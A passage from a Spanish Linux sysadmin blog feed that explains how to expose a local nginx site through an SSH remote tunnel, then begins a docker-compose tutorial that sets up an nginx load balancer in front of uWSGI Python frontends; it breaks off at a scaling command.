&lt;p&gt;Entonces el usuario inicial se conecta a su local en el puerto 1234. Lo que envíe por ese &lt;em&gt;socket&lt;/em&gt; va a aparecer en &lt;em&gt;server1:1111&lt;/em&gt;, que lo entregará al otro túnel, y este al tercero. Esto significa que lo que hemos enviado por el &lt;em&gt;socket&lt;/em&gt; va a ir a parar a &lt;em&gt;server3:3333&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Un ejemplo de túnel remoto&lt;/h2&gt;
&lt;p&gt;Imaginemos que tenemos un servicio en una máquina que no es visible desde internet, y que tenemos un proyecto en desarrollo que queremos hacer accesible. La idea es que vamos a crear túnel remoto, de forma que un puerto en una máquina remota conecte con un puerto en nuestra máquina local.&lt;/p&gt;
&lt;p&gt;Para simplificar, vamos a exponer una web simple, por ejemplo, con &lt;strong&gt;nginx&lt;/strong&gt;. Podemos fijarnos que el puerto escucha solamente en &lt;em&gt;localhost&lt;/em&gt;, aunque podría ser tráfico cortado por un &lt;em&gt;firewall&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:80            &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;3169&lt;/span&gt;/nginx: master 
root@webserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Disponemos de un servidor accesible de forma pública por internet, que es el que va a exponer el puerto web. Creamos el túnel remoto de forma simple.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@webserver:~# ssh -R &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888:localhost:80 user@publicserver -N
user@publicserver&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, vamos a crear un &lt;em&gt;bind&lt;/em&gt; en &lt;em&gt;publicserver&lt;/em&gt;, de forma que va a escuchar en &lt;em&gt;0.0.0.0:8888&lt;/em&gt; y esto va a llevar a el puerto 80 de &lt;em&gt;webserver&lt;/em&gt;. Es el mismo caso que antes, pero en este caso, el origen del túnel esta en el servidor remoto, desde el punto de vista del que lanza el comando &lt;em&gt;ssh&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Otro detalle importante es que hemos declarado que el puerto origen del túnel escuche en todas las direcciones IP, ya que queremos que cualquier persona en internet lo pueda ver.&lt;/p&gt;
&lt;p&gt;Como detalle extra, &lt;strong&gt;SSH&lt;/strong&gt; no permite el &lt;em&gt;bind&lt;/em&gt; en &lt;em&gt;0.0.0.0&lt;/em&gt; por defecto, y para que lo permita, el demonio &lt;strong&gt;SSH&lt;/strong&gt; deber ser configurado con la directiva &lt;em&gt;GatewayPorts&lt;/em&gt;, que ponemos previamente al reinicio del servicio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@publicserver:~# grep -i gatewayports /etc/ssh/sshd_config 
GatewayPorts yes
root@publicserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos ver como el servidor &lt;em&gt;publicserver&lt;/em&gt; ha expuesto correctamente el puerto en todas las interfaces.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@publicserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888            &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;13&lt;/span&gt;/sshd: root   
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::8888                 :::*                    LISTEN      &lt;span class="m"&gt;13&lt;/span&gt;/sshd: root   
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;1&lt;/span&gt;/sshd          
root@publicserver:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora ya podemos acceder a nuestra web desde cualquier punto conectado a internet, solo que lo haremos en el puerto abierto en el servidor público. El túnel se encarga de entregarlo al servidor no visible en internet.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://172.17.0.2:8888/
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;Welcome to nginx on Debian!&amp;lt;/title&amp;gt;
&amp;lt;style&amp;gt;
    body &lt;span class="o"&gt;{&lt;/span&gt;
        width: 35em&lt;span class="p"&gt;;&lt;/span&gt;
        margin: &lt;span class="m"&gt;0&lt;/span&gt; auto&lt;span class="p"&gt;;&lt;/span&gt;
        font-family: Tahoma, Verdana, Arial, sans-serif&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Welcome to nginx on Debian!&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed and
working on Debian. Further configuration is required.&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;For online documentation and support please refer to
&amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://nginx.org/&amp;quot;&lt;/span&gt;&amp;gt;nginx.org&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;
      Please use the &amp;lt;tt&amp;gt;reportbug&amp;lt;/tt&amp;gt; tool to report bugs in the
      nginx package with Debian. However, check &amp;lt;a
      &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://bugs.debian.org/cgi-bin/pkgreport.cgi?ordering=normal;archive=0;src=nginx;repeatmerged=0&amp;quot;&lt;/span&gt;&amp;gt;existing
      bug reports&amp;lt;/a&amp;gt; before reporting a new bug.
&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;&amp;lt;em&amp;gt;Thank you &lt;span class="k"&gt;for&lt;/span&gt; using debian and nginx.&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;


&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="ssh"></category><category term="túnel"></category></entry><entry><title>Microservicios con docker-compose</title><link href="http://www.linuxsysadmin.ml/2016/10/microservicios-con-docker-compose.html" rel="alternate"></link><published>2016-10-24T08:00:00+02:00</published><updated>2016-10-24T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-10-24:/2016/10/microservicios-con-docker-compose.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; es una gran herramienta para levantar contenedores aislados, pero en el mundo real nos encontramos con despliegues mas complejos, que requieren varias imágenes trabajando en conjunto. En este caso, levantar los contenedores puede ser una auténtica pesadilla. Para automatizar estos casos podemos utilizar un &lt;em&gt;orquestador&lt;/em&gt;, como por ejemplo, &lt;strong&gt;docker-compose …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; es una gran herramienta para levantar contenedores aislados, pero en el mundo real nos encontramos con despliegues mas complejos, que requieren varias imágenes trabajando en conjunto. En este caso, levantar los contenedores puede ser una auténtica pesadilla. Para automatizar estos casos podemos utilizar un &lt;em&gt;orquestador&lt;/em&gt;, como por ejemplo, &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Para entender como funciona nos vamos a servir de un microservicio básico, que consiste en un &lt;em&gt;balanceador&lt;/em&gt; público y varios &lt;em&gt;frontends&lt;/em&gt;, que en este caso van a ser mínimos para no complicar innecesariamente este artículo.&lt;/p&gt;
&lt;p&gt;Estos &lt;em&gt;frontends&lt;/em&gt; van a responder a las peticiones con su &lt;em&gt;hostname&lt;/em&gt;, solo para ver que el balanceador hace lo que debe. En un caso mas cercano a la realidad, las aplicaciones harían algo mas útil, posiblemente utilizando una base de datos.&lt;/p&gt;
&lt;h2&gt;El balanceador&lt;/h2&gt;
&lt;p&gt;Esta imagen se declara con un &lt;em&gt;Dockerfile&lt;/em&gt; y sus ficheros auxiliares. Aunque en este caso se ha copiado un &lt;a href="http://www.linuxsysadmin.ml/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html"&gt;artículo anterior&lt;/a&gt;, se vuelven a exponer los ficheros por comodidad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat balancer/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx
COPY nginx.conf /etc/nginx/
COPY config.sh entrypoint.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/entrypoint.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat balancer/nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat balancer/config.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;upstream backend {&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; BACKEND in &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/,/ /g&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  server &lt;/span&gt;&lt;span class="nv"&gt;$BACKEND&lt;/span&gt;&lt;span class="s2"&gt;;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;

&lt;span class="s2"&gt;server {&lt;/span&gt;
&lt;span class="s2"&gt;    listen 80;&lt;/span&gt;
&lt;span class="s2"&gt;    server_name _;&lt;/span&gt;

&lt;span class="s2"&gt;    location / {&lt;/span&gt;
&lt;span class="s2"&gt;        proxy_pass http://backend;&lt;/span&gt;
&lt;span class="s2"&gt;    }&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat balancer/entrypoint.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

./config.sh &amp;gt; /etc/nginx/conf.d/balancer
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El frontend&lt;/h2&gt;
&lt;p&gt;Vamos a poner una aplicación básica en &lt;strong&gt;python&lt;/strong&gt;, que se va a servir con el servidor de aplicaciones &lt;strong&gt;uWSGI&lt;/strong&gt; y solo va a informar de su &lt;em&gt;hostname&lt;/em&gt;. Ahí pego su &lt;em&gt;Dockerfile&lt;/em&gt; y los otros ficheros auxiliares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat frontend/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache uwsgi-python
COPY app.py app.ini /opt/app/
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uwsgi&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--plugin=python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/opt/app/app.ini&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat frontend/app.py 
import os

def app&lt;span class="o"&gt;(&lt;/span&gt;environ, start_response&lt;span class="o"&gt;)&lt;/span&gt;:
    start_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)])&lt;/span&gt;
    yield os.uname&lt;span class="o"&gt;()[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; + &lt;span class="s1"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;
gerard@sirius:~/docker/composetest$ cat frontend/app.ini 
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
http-socket &lt;span class="o"&gt;=&lt;/span&gt; :8080
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/app/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Declarando y levantando el servicio con docker-compose&lt;/h2&gt;
&lt;p&gt;Vamos a crear un fichero para gobernar las acciones de &lt;strong&gt;docker-compose&lt;/strong&gt;, siguiendo la &lt;a href="https://docs.docker.com/compose/compose-file/"&gt;documentación&lt;/a&gt;. La filosofía es muy simple; vamos a declarar como se construyen las imágenes, los puertos que publican y exponen, las variables de entorno necesarias y las dependencias entre las imágenes.&lt;/p&gt;
&lt;p&gt;Empezamos con la imagen que no tiene dependencias, que es el &lt;em&gt;frontend&lt;/em&gt;. Simplemente indicamos la carpeta que contiene el &lt;em&gt;Dockerfile&lt;/em&gt; (desde la carpeta actual, por ejemplo), y vamos a indicar el puerto que expone, tal como indica la configuración de &lt;strong&gt;uWSGI&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El balanceador es un poco mas complejo; hay que indicar que no se puede levantar hasta que lo hagan los &lt;em&gt;frontends&lt;/em&gt;, porque sino, el &lt;strong&gt;nginx&lt;/strong&gt; no puede resolver sus nombres y acabaría inmediatamente. Hay que indicar que necesita acceso a los &lt;em&gt;frontends&lt;/em&gt; para comunicar con su puerto 8080, y que vamos a publicar el puerto 80 en el contenedor como el 8888 en nuestra máquina física. El último paso es declarar las variables de entorno que se van a pasar al contenedor cuando este se ejecute; en este caso declaramos los servidores contra los que hay que hacer balanceo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: Cuando ejecutemos &lt;strong&gt;docker-compose&lt;/strong&gt;, va a levantar una instancia de cada imagen, pudiendo escalar a &lt;em&gt;posteriori&lt;/em&gt;. Como &lt;strong&gt;nginx&lt;/strong&gt; no va  levantar si no conoce alguno de los &lt;em&gt;hostnames&lt;/em&gt; contra los que balancea, vamos indicar solamente el primero.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  frontend:
    build: frontend
    expose:
      - &lt;span class="m"&gt;8080&lt;/span&gt;
  balancer:
    build: balancer
    depends_on:
      - frontend
    links:
      - frontend
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8888:80&amp;quot;&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;composetest_frontend_1:8080
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con todo delcarado, solo nos falta levantar el servicio. Esto va a reconstruir todas las imágenes que crea necesarias, ya levantar los contenedores que no lo estén.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;composetest_default&amp;quot;&lt;/span&gt; with the default driver
Building frontend
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache uwsgi-python
 ---&amp;gt; Running in a57c36878d96
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing mailcap &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.44-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi-python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
OK: &lt;span class="m"&gt;53&lt;/span&gt; MiB in &lt;span class="m"&gt;25&lt;/span&gt; packages
 ---&amp;gt; 9749e8e317a7
Removing intermediate container a57c36878d96
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY app.py app.ini /opt/app/
 ---&amp;gt; 98c310db1c73
Removing intermediate container 141de70e5976
Step &lt;span class="m"&gt;4&lt;/span&gt; : ENTRYPOINT uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt/app/app.ini
 ---&amp;gt; Running in 7e5243bddee1
 ---&amp;gt; 27da8b15e8b4
Removing intermediate container 7e5243bddee1
Successfully built 27da8b15e8b4
Creating composetest_frontend_1
Building balancer
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 4e38e38c8ce0
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /run/nginx
 ---&amp;gt; Running in 5e7a6e24b1ea
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing nginx-common &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing nginx-common-1.10.1-r1.pre-install
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing nginx &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
OK: &lt;span class="m"&gt;6&lt;/span&gt; MiB in &lt;span class="m"&gt;14&lt;/span&gt; packages
 ---&amp;gt; b413d5ba8f3b
Removing intermediate container 5e7a6e24b1ea
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY nginx.conf /etc/nginx/
 ---&amp;gt; e7db8e5794db
Removing intermediate container e33eef86f883
Step &lt;span class="m"&gt;4&lt;/span&gt; : COPY config.sh entrypoint.sh /
 ---&amp;gt; e6fda1c75d22
Removing intermediate container 6cd5103894a9
Step &lt;span class="m"&gt;5&lt;/span&gt; : ENTRYPOINT /entrypoint.sh
 ---&amp;gt; Running in cd26bbeaa306
 ---&amp;gt; ff47baa82723
Removing intermediate container cd26bbeaa306
Successfully built ff47baa82723
Creating composetest_balancer_1
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que ahora tenemos un solo contenedor por imagen declarada:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose ps
         Name                       Command               State          Ports         
--------------------------------------------------------------------------------------
composetest_balancer_1   /entrypoint.sh                   Up      &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8888-&amp;gt;80/tcp 
composetest_frontend_1   uwsgi --plugin&lt;span class="o"&gt;=&lt;/span&gt;python /opt ...   Up      &lt;span class="m"&gt;8080&lt;/span&gt;/tcp             
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y si probamos nuestro servicio, vemos que funciona, aunque solo balancea contra un &lt;em&gt;frontend&lt;/em&gt;, que es lo que indicamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ curl http://localhost:8888/
9ae8f4367e2b
gerard@sirius:~/docker/composetest$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Escalando nuestro servicio&lt;/h2&gt;
&lt;p&gt;Escalar no es fácil; &lt;strong&gt;docker-compose&lt;/strong&gt; solo nos permite modificar el número de contenedores de cada tipo que están corriendo en un momento dado. Para que estos nuevos contenedores reciban peticiones, hay que modificar la configuración del balanceador.&lt;/p&gt;
&lt;p&gt;Empezaremos levantando otras 3 instancias de nuestro &lt;em&gt;frontend&lt;/em&gt;; indicando que queremos 4, &lt;strong&gt;docker-compose&lt;/strong&gt; va a levantar las 3 que faltan.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/composetest$ docker-compose scale &lt;span class="nv"&gt;frontend&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;
